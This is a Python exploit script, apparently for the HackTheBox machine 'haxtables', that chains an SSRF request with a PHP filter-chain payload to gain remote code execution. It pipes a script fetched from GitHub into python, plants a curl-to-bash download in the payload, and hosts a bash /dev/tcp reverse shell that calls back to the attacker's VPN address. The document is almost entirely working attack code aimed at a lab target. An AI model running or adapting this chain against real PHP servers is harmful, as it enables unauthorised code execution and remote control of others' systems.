#!/usr/bin/env python3

"""
Author: poorduck
Usage: python3 script.py
"""

import requests as r
import os
import netifaces as ni
import threading
import http.server
import socketserver

# Get hackthebox vpn ip from tun0 interface
try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

# function for creating php filter chain using synacktiv "php_filter_chain_generator.py" script from github
def gen_php_chain(ip):
    command = f'curl -s https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py | python - --chain \'<?= `curl http://{ip}:8000/rev.sh|bash` ;?>\''
    output_file = os.popen(command)
    output = output_file.read()
    output_file.close()
    php_chain = output.split('\n')[1]
    return php_chain

# function for hosting reverse shell
def start_http_server(port, ip):
    with open('rev.sh', 'w') as f:
        f.write(f'/bin/bash -i >& /dev/tcp/{ip}/4141 0>&1')

    try:
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), Handler)

        # print("Serving at port", port)
        httpd.serve_forever()
    except OSError as e:
        print(e)


try:
    # Start http server on child thread
    port = 8000
    http_thread = threading.Thread(target=start_http_server, args=(port,tun0_ip))
    http_thread.daemon = True
    http_thread.start()
    
    # Generate php chain
    rce_chain = gen_php_chain(tun0_ip)

    url = "http://api.haxtables.htb/v3/tools/string/index.php"
    ssrf_uri = f"image.haxtables.htb/actions/action_handler.php?page={rce_chain}"
    data = {"action":"urldecode","file_url":f"{ssrf_uri}"}

    resp = r.post(url, json=data)
    print(resp.text)
    
    if os.path.isfile("rev.sh"): os.remove("rev.sh")
except KeyboardInterrupt as e:
    if os.path.isfile("rev.sh"): os.remove("rev.sh")
    print(e)
except Exception as e:
    if os.path.isfile("rev.sh"): os.remove("rev.sh")
    print(e)
